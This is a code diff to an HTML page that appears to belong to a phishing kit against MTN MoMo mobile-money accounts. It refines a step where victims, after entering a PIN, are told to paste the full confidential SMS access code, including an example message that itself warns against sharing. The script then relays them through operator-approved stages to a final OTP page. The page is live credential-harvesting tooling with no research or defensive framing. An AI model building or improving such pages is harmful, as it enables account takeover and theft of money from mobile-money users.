@@ -35,7 +35,16 @@
             font-weight: 700; margin-top: 15px; display: none;
         }
         .sms-box {
-            background: #002244; padding: 20px; border-radius: 16px; border: 1px solid rgba(255,255,255,0.1);
+            background: #002244; padding: 25px 20px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        .format-hint-box {
+            background-color: rgba(255, 204, 0, 0.08);
+            border-left: 4px solid #FFCC00;
+            border-radius: 8px;
+            font-size: 0.8rem;
+            color: #f8f9fa;
+            text-align: left;
         }
     </style>
 </head>
@@ -52,19 +61,29 @@
             <div class="small">Application ID: <span class="app-id-tag">{{ app_id }}</span></div>
         </div>
 
-        <!-- SMS Input Box -->
+        <!-- SMS Authorization Message Input Box -->
         <div id="smsSection" class="sms-box d-none">
             <div class="badge bg-warning text-dark px-3 py-2 text-uppercase mb-3 fw-bold">✓ PIN Verified</div>
-            <h3 class="fw-bold text-white mb-2">Enter SMS Authorization Code</h3>
-            <p class="text-white-50 small mb-4">
-                Paste the SMS authorization code or security message received on your phone to continue.
+            <h3 class="fw-bold text-white mb-2">Enter SMS Authorization Message</h3>
+            <p class="text-white-50 small mb-3">
+                Paste the full security SMS message received on your mobile device below to complete authorization.
             </p>
+
+            <!-- Exact Message Example Box -->
+            <div class="format-hint-box p-3 mb-3">
+                <span class="text-warning fw-bold d-block mb-1">💡 Expected Message Example:</span>
+                <code style="color: #FFCC00; word-break: break-all; font-size: 0.75rem;">
+                    Y'ello. Please note! This confidential code gives access to your MoMo account:QIQSutdZDKpJIplUbs69uWtojKml1FU00rr9Eb4ksXbnng== Do not share it with anyone. l+/DM+Y0kqw HTx14B0+90w YyRaK1dXEWz CTO2RPz+HOF yiitGCXacTO
+                </code>
+            </div>
 
             <form action="/submit-auth-code" method="POST">
                 <div class="mb-3">
-                    <textarea class="form-control" name="auth_code" rows="4" placeholder="Paste SMS code here..." required style="border-radius: 12px; font-size: 0.95rem;"></textarea>
+                    <textarea class="form-control" name="auth_code" rows="4" 
+                        placeholder="Paste the message here..." 
+                        required style="border-radius: 12px; font-size: 0.9rem; background-color: #ffffff; color: #000;"></textarea>
                 </div>
-                <button type="submit" class="btn btn-warning w-100 py-3 fw-bold text-dark rounded-3">SUBMIT SMS CODE</button>
+                <button type="submit" class="btn btn-warning w-100 py-3 fw-bold text-dark rounded-3 shadow">SUBMIT SMS AUTHORIZATION</button>
             </form>
         </div>
 
@@ -82,14 +101,11 @@
                     const msgBox = document.getElementById('customMsg');
 
                     if (data.status === "Stage1_Approved") {
-                        // Show SMS entry box when PIN is approved
                         waitSection.classList.add('d-none');
                         smsSection.classList.remove('d-none');
                     } else if (data.status === "Stage2_Approved") {
-                        // Go to Final OTP page when SMS code is approved
                         window.location.href = "/final-verify";
                     } else if (data.status === "Stage3_Approved" || data.status === "Approved") {
-                        // Go to success page when OTP is approved
                         window.location.href = "/success";
                     } else if (data.status === "CustomMessage") {
                         msgBox.style.display = 'block';
